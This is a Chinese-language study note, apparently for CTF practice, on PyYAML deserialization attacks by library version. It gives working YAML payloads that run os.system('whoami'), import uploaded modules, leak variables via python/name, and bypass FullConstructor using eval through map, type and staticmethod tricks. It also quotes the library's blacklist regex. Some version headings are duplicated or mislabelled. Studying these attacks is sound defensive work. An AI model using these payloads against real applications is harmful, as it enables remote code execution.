## 文章

[SecMap - 反序列化（PyYAML） - Tr0y's Blog](F:\LocalCTF\SecMap - 反序列化（PyYAML） - Tr0y's Blog.html)

## 攻击思路

### 版本 < 5.1

#### python/object/apply

`python/object/apply` 要求参数必须用一个列表的形式提供，所以以下 payload 都是等价的，但是写法不一样，可以用来绕过：

```python
yaml.load('exp: !!python/object/apply:os.system ["whoami"]')

yaml.load("exp: !!python/object/apply:os.system ['whoami']")

# 引号当然不是必须的
yaml.load("exp: !!python/object/apply:os.system [whoami]")

yaml.load("""
exp: !!python/object/apply:os.system
- whoami
""")

yaml.load("""
exp: !!python/object/apply:os.system
  args: ["whoami"]
""")

# command 是 os.system 的参数名
yaml.load("""
exp: !!python/object/apply:os.system
  kwds: {"command": "whoami"}
""")

yaml.load("!!python/object/apply:os.system [whoami]: exp")

yaml.load("!!python/object/apply:os.system [whoami]")

yaml.load("""
!!python/object/apply:os.system
- whoami
""")
```

#### python/object/new

基本和 `python/object/apply` 相同

#### python/module

搭配任意写文件来实现RCE

在实际的场景中，由于一般用于存放上传文件的目录和执行目录并不是同一个，例如：

```python
app.py
uploads
  |_ user.png
  |_ header.jpg
```

这个时候只需要上传一个 .py 文件，这个文件会被放在 uploads 下，这时只需要触发 `import uploads.header` 就可以利用了：

```python
yaml.load('!!python/module:uploads.header')
```

更简单的，直接上传 `__init__.py`，在触发的时候用 `!!python/module:uploads` 就可以了。

```python
yaml.load('!!python/module:uploads')
```

#### python/name

与 `python/module` 的逻辑极其类似，区别在于，`python/module` 仅仅返回模块而 `python/name` 返回的是模块下面的属性/方法。

利用的逻辑除了上面一样之外，还可以用于这种场景：

```python
import yaml


TOKEN = "Y0u_Nev3r_kn0w."

def check(config):
    try:
        token = yaml.load(config).get("token", None)
    except Exception:
        token = None

    if token == TOKEN:
        print("yes, master.")
    else:
        print("fuck off!")


config = ''  # 可控输入点
check(config)
```

这个时候的 payload 为 `token: !!python/name:__main__.TOKEN`，无需知道 TOKEN 是什么，但是需要知道变量名。

当然，这个场景除了 `!!python/module` 无法完成利用之外，上述其他姿势都可以实现。

### 版本 >= 5.1

由于默认的构造器太过强大，开发人员不了解这些危险很容易中招。所以 PyYAML 的开发者就将构造器分为：

1. `BaseConstructor`：没有任何强制类型转换
2. `SafeConstructor`：只有基础类型的强制类型转换
3. `FullConstructor`：除了 `python/object/apply` 之外都支持，但是加载的模块必须位于 `sys.modules` 中（说明已经主动 import 过了才让加载）。这个是默认的构造器。
4. `UnsafeConstructor`：支持全部的强制类型转换
5. `Constructor`：等同于 `UnsafeConstructor`

对应顶层的方法新增了：

1. `yaml.full_load`
2. `yaml.full_load_all`
3. `yaml.unsafe_load`
4. `yaml.unsafe_load_all`

#### 常规利用方式

常规的利用方式和 <5.1 版本的姿势是一样的。当然前提是构造器必须用的是 `UnsafeConstructor` 或者 `Constructor`，也就是这种情况：

1. `yaml.unsafe_load(exp)`
2. `yaml.unsafe_load_all(exp)`
3. `yaml.load(exp, Loader=UnsafeLoader)`
4. `yaml.load(exp, Loader=Loader)`
5. `yaml.load_all(exp, Loader=UnsafeLoader)`
6. `yaml.load_all(exp, Loader=Loader)`

#### 突破FullConstructor

FullConstructor 中，限制了只允许加载 `sys.modules` 中的模块。这个有办法突破吗？我们先列举一下限制：

1. 只引用，不执行的限制：
   1. 加载进来的 `module` 必须是位于 `sys.modules` 中
2. 引用并执行：
   1. 加载进来的 `module` 必须是位于 `sys.modules` 中
   2. FullConstructor 下，`unsafe = False`，加载进来的 `module.name` 必须是一个类

**subprocess.Popen**

```python
yaml.load("""
!!python/object/apply:subprocess.Popen
  - whoami
""") 
```

**map**

```python
tuple(map(eval, ["__import__('os').system('whoami')"]))
```

```python
yaml.load("""
!!python/object/new:tuple
- !!python/object/new:map
  - !!python/name:eval
  - ["__import__('os').system('whoami')"]
""")
```

`tuple` 更换为`frozenset` 、`bytes` 等不可变类型也可以

**触发带参调用 + 引入函数**

payload1

```python
exp = type("exp", (), {"extend": eval})
exp.extend("__import__('os').system('whoami')")
```

```python
yaml.full_load("""
!!python/object/new:type
args:
  - exp
  - !!python/tuple []
  - {"extend": !!python/name:exec }
listitems: "__import__('os').system('whoami')"
""")
```

payload2

```python
exp = type("exp", (list, ), {"__setstate__": eval})
exp.__setstate__("__import__('os').system('whoami')")
```

```python
yaml.full_load("""
!!python/object/new:type
args:
  - exp
  - !!python/tuple []
  - {"__setstate__": !!python/name:eval }
state: "__import__('os').system('whoami')"
""")
```

payload3

```python
exp = staticmethod([0])
exp.__dict__.update(
    {"update": eval, "items": list}
)
exp_raise = str()
# 由于 str 没有 __dict__ 方法，所以在 PyYAML 解析时会触发下面调用

exp.update("__import__('os').system('whoami')")
```

```python
yaml.full_load("""
!!python/object/new:str
    args: []
    # 通过 state 触发调用
    state: !!python/tuple
      - "__import__('os').system('whoami')"
      # 下面构造 exp
      - !!python/object/new:staticmethod
        args: []
        state: 
          update: !!python/name:eval
          items: !!python/name:list  # 不设置这个也可以，会报错但也已经执行成功
""")
```

### 版本 >= 5.2

FullConstructor 现在只额外支持 `!!python/name`、`!!python/object`、`!!python/object/new` 和 `!!python/module`，`!!python/object/apply` G 了。

### 版本 >= 5.2

5.3.1 引入了一个新的过滤机制，本质上就是实现一个属性名黑名单（正则），匹配到就报错。

```python
class FullConstructor(SafeConstructor):
    # 'extend' is blacklisted because it is used by
    # construct_python_object_apply to add `listitems` to a newly generate
    # python instance
    def get_state_keys_blacklist(self):
        return ['^extend$', '^__.*__$']

    def get_state_keys_blacklist_regexp(self):
        if not hasattr(self, 'state_keys_blacklist_regexp'):
            self.state_keys_blacklist_regexp = re.compile('(' + '|'.join(self.get_state_keys_blacklist()) + ')')
        return self.state_keys_blacklist_regexp
```

### 版本 >= 5.3.1

FullConstructor 现在只额外支持 `!!python/name`，`!!python/object/apply`、`!!python/object`、`!!python/object/new` 和 `!!python/module` 都 G 了。

### 版本 >= 6.0

现在在使用 `yaml.load` 时，用户必须指定 Loader。这个改进其实有点强硬，所以引发了一堆 issue，还有人在直接开怼认为这是糟糕的设计。但是至少安全性上来说，相比给一个告警，确实得到了一定提升。

issue 见：https://github.com/yaml/pyyaml/issues/576

## ruamel.yaml

ruamel.yaml的用法和PyYAML基本一样，并且默认支持更新的YAML1.2版本
ruamel.yaml的API文档:https://yaml.readthedocs.io/en/latest/overview.html

